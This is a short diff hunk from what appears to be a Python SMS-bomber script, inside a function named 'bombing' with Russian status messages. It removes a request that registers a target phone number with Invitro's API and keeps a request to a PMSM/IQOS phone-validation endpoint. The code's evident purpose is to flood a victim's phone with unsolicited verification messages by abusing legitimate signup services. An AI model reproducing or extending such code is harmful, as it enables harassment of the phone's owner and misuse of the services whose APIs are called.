@@ -249,12 +249,6 @@ def bombing():
         print('[-] Не отправлено!')
 
     try:
-        requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={'password': password, 'application': 'lkp', 'login': '+' + phone})
-        print('[+] Invitro отправлено!')
-    except:
-        print('[-] Не отправлено!')
-
-    try:
         requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={'phone': phone})
         print('[+] Pmsm отправлено!')
     except:
